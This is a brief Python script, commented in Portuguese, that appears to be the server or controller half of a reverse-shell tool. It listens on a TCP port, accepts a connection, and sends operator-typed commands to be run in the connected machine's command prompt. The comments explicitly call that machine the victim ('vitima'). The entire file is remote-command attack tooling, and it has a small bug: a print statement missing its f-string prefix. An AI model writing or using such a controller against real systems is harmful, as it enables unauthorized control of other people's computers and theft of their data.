from socket import *

#AF_INET == IPV4, SOCK_STREAM == TCP
server = socket(AF_INET,SOCK_STREAM)
#ip e porta 
server.bind(("localhost",8080))
#servidor inicia
server.listen()
client, address = server.accept()



print("connect {address}")


while True:
    
    receive = client.recv(1024).decode()
    print(receive)
    #digite o comando para rodar no cmd do cliente
    cmd = input("Digite o seu comando: ")

    #digite 'exit' para sair
    if cmd.lower() == "exit":
        client.send(cmd.encode())
        exit()
    elif cmd == "" or cmd == None:
        cmd = "error"
        client.send(cmd.encode())
    #envia o comando para a vitima
    else:
        client.send(cmd.encode())
